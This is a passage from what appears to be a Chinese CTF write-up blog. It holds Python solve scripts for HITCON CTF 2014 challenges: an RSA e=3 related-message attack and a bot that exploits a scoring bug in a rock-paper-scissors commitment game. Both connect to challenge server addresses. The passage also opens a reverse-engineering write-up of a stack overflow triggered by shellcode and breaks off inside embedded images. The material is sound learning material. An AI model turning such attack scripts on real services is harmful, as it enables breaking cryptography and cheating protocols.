class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> socket</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_m</span><span class="params">(n,c1,c2)</span>:</span></div><div class="line">    e=<span class="number">3</span></div><div class="line">    x = PolynomialRing(ZZ.quo(n*ZZ), <span class="string">'x'</span>).gen()</div><div class="line">    f=x**e-c1</div><div class="line">    g=(x+<span class="number">1</span>)**e-c2</div><div class="line">    a = f</div><div class="line">    b = g</div><div class="line">    i = <span class="number">0</span></div><div class="line"></div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        r = a % b</div><div class="line">        <span class="comment">#print i</span></div><div class="line">        <span class="keyword">if</span> r == <span class="number">0</span>:</div><div class="line">            <span class="comment">#print 'FOUND %s' % rp</span></div><div class="line">            c = rp.coeffs()</div><div class="line">            <span class="keyword">return</span> int(-pow(c\[<span class="number">1</span>\], <span class="number">-1</span>, n) * c\[<span class="number">0</span>\])</div><div class="line">        rp = r</div><div class="line">        a, b = b, r</div><div class="line">        i += <span class="number">1</span></div><div class="line"></div><div class="line">sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)</div><div class="line">sock.connect((<span class="string">'54.64.40.172'</span>, <span class="number">5454</span>))</div><div class="line"></div><div class="line">recv = sock.recv(<span class="number">100000</span>)</div><div class="line"><span class="keyword">print</span> repr(recv)</div><div class="line">n = int(recv)</div><div class="line">recv = sock.recv(<span class="number">100000</span>)</div><div class="line">c = recv.split(<span class="string">'n'</span>)</div><div class="line">c1 = int(c\[<span class="number">1</span>\])</div><div class="line">c2 = int(c\[<span class="number">2</span>\])</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">'n:%d'</span> % n</div><div class="line"><span class="keyword">print</span> <span class="string">'c1:%d'</span> % c1</div><div class="line"><span class="keyword">print</span> <span class="string">'c2:%d'</span> % c2</div><div class="line"></div><div class="line">m = get_m(n,c1,c2)</div><div class="line"><span class="keyword">print</span> m</div><div class="line">sock.send(<span class="string">"%dn"</span> % m)</div><div class="line"></div><div class="line">recv = sock.recv(<span class="number">100000</span>)</div><div class="line"><span class="keyword">print</span> repr(recv)</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</div><div class="line">    recv = sock.recv(<span class="number">100000</span>)</div><div class="line">    <span class="keyword">print</span> repr(recv)</div><div class="line">    c = recv.split(<span class="string">'n'</span>)</div><div class="line">    <span class="keyword">print</span> c</div><div class="line">    n = int(c\[<span class="number">1</span>\])</div><div class="line">    c1 = int(c\[<span class="number">2</span>\])</div><div class="line">    c2 = int(c\[<span class="number">3</span>\])</div><div class="line"></div><div class="line">    <span class="keyword">print</span> <span class="string">'n:%d'</span> % n</div><div class="line">    <span class="keyword">print</span> <span class="string">'c1:%d'</span> % c1</div><div class="line">    <span class="keyword">print</span> <span class="string">'c2:%d'</span> % c2</div><div class="line"></div><div class="line">    m = get_m(n,c1,c2)</div><div class="line">    <span class="keyword">print</span> <span class="string">'m:%d'</span> % m</div><div class="line">    sock.send(<span class="string">"%dn"</span> % m)</div><div class="line"></div><div class="line">    recv = sock.recv(<span class="number">100000</span>)</div><div class="line">    <span class="keyword">print</span> repr(recv)</div></pre></td></tr></table></figure>
<h1 id="0x03-finger"><a href="#0x03-finger" class="headerlink" title="0x03 finger"></a>0x03 finger</h1><p>是ginger的简单版，因为出题人留bug了所以变简单了。。 分析程序，一开始出3个字符串，自己选一个，BOSS选一个。 三个字符串是循环取胜的关系，相当于要跟boss比猜拳。 你先选一个，然后发送这个字符串开头的16位字符串的md5给它，然后boss告诉你它选了什么，之后你再发你选了什么。比胜负。 那个验证的部分我说的简单了，ginger就是要绕过这个验证部分。 finger的话有个bug。如果你作弊了，就是前后不一的话扣1血。你赢了boss它扣1-3血，所以总是可以赢的。 下面是代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python2.7  </span></div><div class="line">\<span class="comment"># -*- coding: utf-8 -*- </span></div><div class="line"><span class="string">'''</span></div><div class="line">Created on 2014年8月17日</div><div class="line"></div><div class="line">@author: yf</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">import</span> md5</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5</span><span class="params">(hand)</span>:</span></div><div class="line">    <span class="keyword">return</span> int(md5.md5(hand).hexdigest(),<span class="number">16</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> \_\_name\_\_ == <span class="string">'\_\_main\_\_'</span>:</div><div class="line">    sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)</div><div class="line">    sock.connect((<span class="string">'210.71.253.236'</span>,<span class="number">7171</span>))</div><div class="line"></div><div class="line">    <span class="comment">#round num</span></div><div class="line">    recv = sock.recv(<span class="number">1024</span>)</div><div class="line"></div><div class="line">    recv = sock.recv(<span class="number">1024</span>)</div><div class="line">    recv = recv.split(<span class="string">'n'</span>)</div><div class="line">    hands=\[\]</div><div class="line">    <span class="keyword">print</span> recv\[<span class="number">3</span>\]\[<span class="number">9</span>:\]</div><div class="line">    hands = eval (recv\[<span class="number">3</span>\]\[<span class="number">9</span>:\])</div><div class="line">    secret = hands\[<span class="number">2</span>\]+<span class="string">'11111111111'</span></div><div class="line">    sock.send(<span class="string">"1n"</span>)</div><div class="line">    recv = sock.recv(<span class="number">1024</span>)</div><div class="line">    <span class="keyword">print</span> recv</div><div class="line">    sock.send(<span class="string">"%dn"</span> % get_md5(secret))</div><div class="line"></div><div class="line">    time.sleep(<span class="number">2</span>)</div><div class="line">    recv = sock.recv(<span class="number">1024</span>)</div><div class="line">    <span class="keyword">print</span> recv</div><div class="line">    his_hand = recv\[recv.find(<span class="string">'e:'</span>)+<span class="number">3</span>:recv.find(<span class="string">'e:'</span>)+<span class="number">8</span>\]</div><div class="line">    <span class="keyword">print</span> <span class="string">'HIS:'</span>+his_hand</div><div class="line">    <span class="keyword">if</span> his_hand==hands\[<span class="number">0</span>\]:</div><div class="line">        sock.send(<span class="string">'111n'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        sock.send(secret+<span class="string">'n'</span>)</div><div class="line">    recv = sock.recv(<span class="number">1024</span>)</div><div class="line">    <span class="keyword">print</span> recv</div><div class="line"></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        <span class="comment">#new round</span></div><div class="line">        time.sleep(<span class="number">0.5</span>)</div><div class="line">        recv = sock.recv(<span class="number">1024</span>)</div><div class="line">        <span class="keyword">print</span> recv</div><div class="line">        recv = recv.split(<span class="string">'n'</span>)</div><div class="line">        <span class="keyword">print</span> recv</div><div class="line"></div><div class="line">        hands = eval (recv\[<span class="number">4</span>\]\[<span class="number">9</span>:\])</div><div class="line">        secret = hands\[<span class="number">2</span>\]+<span class="string">'11111111111'</span></div><div class="line">        sock.send(<span class="string">"1n"</span>)</div><div class="line">        recv = sock.recv(<span class="number">1024</span>)</div><div class="line">        <span class="keyword">print</span> recv</div><div class="line">        sock.send(<span class="string">"%dn"</span> % get_md5(secret))</div><div class="line">        time.sleep(<span class="number">2</span>)</div><div class="line">        recv = sock.recv(<span class="number">1024</span>)</div><div class="line">        <span class="keyword">print</span> recv</div><div class="line">        his_hand = recv\[recv.find(<span class="string">'e:'</span>)+<span class="number">3</span>:recv.find(<span class="string">'e:'</span>)+<span class="number">8</span>\]</div><div class="line">        <span class="keyword">print</span> <span class="string">'HIS:'</span>+his_hand</div><div class="line"></div><div class="line">        <span class="keyword">if</span> his_hand==hands\[<span class="number">0</span>\]:</div><div class="line">            sock.send(<span class="string">'111n'</span>)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            sock.send(secret+<span class="string">'n'</span>)</div><div class="line">        recv = sock.recv(<span class="number">1024</span>)</div><div class="line">        <span class="keyword">print</span> recv</div></pre></td></tr></table></figure>
                    
                        
                    
                    
                        <p>
                            <a href="/writeups/hitcon-ctf-2014-rsbo-finger-rsaha-writeup/#post-footer" class="postShorten-excerpt_link link">
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/writeups/2nd-360ctf-reverse5-writeup/">
                            第二届360信息技术大赛逆向第五题writeup
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2014-07-03T23:28:53+08:00">
	
		    Jul 03, 2014
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/writeups/">writeups</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <h2 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h2><p>本道题目中的MFC_ASM.exe是一个有漏洞的可执行程序：它会去读取服务器上的一段包含shellcode的文件Exploit.html。 但是，该Exploit.html文件的shellcode并不能直接执行。分析MFC_ASM.exe引发漏洞的代码片段，并修改 Exploit.html文件中的shellcode布局，以便让MFC_ASM.exe正常执行，以便得到KEY。 先搭建该EXE的执行环境： 1、在本地安装appserv[如果不知道appserv是啥，请自行so.com一下]，配置HTTP端口为80 2、将您修改后的Exploit.html以及压缩包中的shell.dat复制到www目录下 3、运行MFC_ASM.exe，如果您成功修复了该Exploit.html，会弹出key，否则，崩溃</p>
<h2 id="MFC-ASM-EXE分析"><a href="#MFC-ASM-EXE分析" class="headerlink" title="MFC_ASM.EXE分析"></a>MFC_ASM.EXE分析</h2><p>（先吐槽下那个网站上的题解根本就是抄题目加放KEY啊- -） 逆向一下可以找到溢出的函数，MFC_ASM.EXE就是上网页把exploit.html下下来，同时栈溢出了。。 这样分析应该是MFC_ASM.EXE从exploit.html下载信息导致溢出，之后触发shellcode然后对shell.bat进行操作，之后导致弹窗。 <img src="data:image/png;base64,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" alt=""> 原先使用时 <img src="data:image/png;base64,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